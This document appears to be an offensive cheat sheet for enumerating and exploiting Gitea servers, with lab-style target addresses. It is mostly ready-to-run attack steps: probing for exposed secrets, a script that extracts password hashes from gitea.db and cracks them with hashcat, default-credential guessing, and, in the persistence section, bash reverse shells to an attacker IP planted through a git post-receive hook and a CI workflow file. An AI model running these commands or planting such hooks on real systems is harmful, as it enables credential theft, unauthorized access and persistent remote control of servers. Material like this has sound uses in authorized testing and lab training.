# Gitea Enumeration & Exploitation

!!! tip "Tip"
    Check for public repos and exposed `.git` directories first. Gitea's explore page (`/explore/repos`) is unauthenticated by default — look for private-looking repos that were accidentally made public.

!!! warning "Watch out"
    Gitea admin credentials are often default (`admin:admin` or `gitea:gitea`) on self-hosted instances spun up quickly for labs or internal tools.

---

## Enumeration

### Identify Gitea Running on Target

Look for these indicators:

- Login page at `/user/login`
- URL patterns like:

    ```
    http://10.10.10.10:3000/
    http://10.10.10.10/user/<user>
    http://10.10.10.10/api/v1/users
    ```

#### HTTP Headers

```bash
curl -I http://10.10.10.10:3000
```

Example:

```
Server: Gitea
Set-Cookie: i_like_gitea=...
```

#### Nmap HTTP Title Scan

```bash
nmap -p 3000 --script http-title 10.10.10.10
```

#### Check for Docker

```bash
curl http://10.10.10.10:3000/.env
curl http://10.10.10.10:3000/docker-compose.yml
```

---

## Credential Extraction via SQLite

If you have access to the `gitea.db` file (e.g., through local file inclusion, volume mount, or post-exploitation), extract hashes using:

```bash
sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do \
digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); \
salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); \
name=$(echo $data | cut -d'|' -f3); \
echo "${name}:sha256:50000:${salt}:${digest}"; \
done | tee gitea.hashes
```

Hash format is compatible with `hashcat` mode `10900` (PBKDF2-HMAC-SHA256).

### Cracking with Hashcat

```bash
hashcat -m 10900 gitea.hashes /usr/share/wordlists/rockyou.txt --force
```

---

## Exploitation

### Common Misconfigurations

#### Anonymous Access to Public Repos

```bash
curl http://10.10.10.10:3000/<org>/<repo>/raw/branch/master/.env
curl http://10.10.10.10:3000/<org>/<repo>/archive/master.zip
```

Check for:

- Hardcoded secrets, AWS creds
- SSH private keys
- DB creds
- JWT secrets
- `.gitlab-ci.yml`, `.github/workflows/`, `Dockerfile`

#### Open Registration + Privilege Escalation

If registration is allowed:

1. Register a user
2. Try accessing `/admin` or exploiting insecure direct object references (IDOR)

#### Exposed Webhooks

Look for outbound webhook definitions in:

```
http://10.10.10.10:3000/<org>/<repo>/settings/hooks
```

You may be able to inject or redirect webhooks to attacker-controlled infrastructure for SSRF or command execution in CI/CD setups.

---

## Useful SQLite Queries

### Dump All Users

```sql
SELECT id, name, passwd, email FROM user;
```

### Check Admin Users

```sql
SELECT name, is_admin FROM user WHERE is_admin=1;
```

### List All Repositories

```sql
SELECT id, name, owner_id FROM repository;
```

### Check for Webhooks

```sql
SELECT * FROM webhook;
```

---

## Persistence Techniques

### Create New User

If you're post-auth and have admin access, create a user with access to all orgs/repos.

```bash
POST /admin/users/new
```

### Reverse Shell via Git Hooks (If Server-Side Exec Enabled)

1. Add `post-receive` or `post-commit` hook:

```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/<attacker-ip>/4444 0>&1' > .git/hooks/post-receive
chmod +x .git/hooks/post-receive
```

2. Push repo and trigger reverse shell.

### Abuse Git Actions or Pipelines

Upload `.github/workflows/pwn.yml`:

```yaml
name: reverse shell
on: [push]
jobs:
  shell:
    runs-on: ubuntu-latest
    steps:
      - run: bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
```

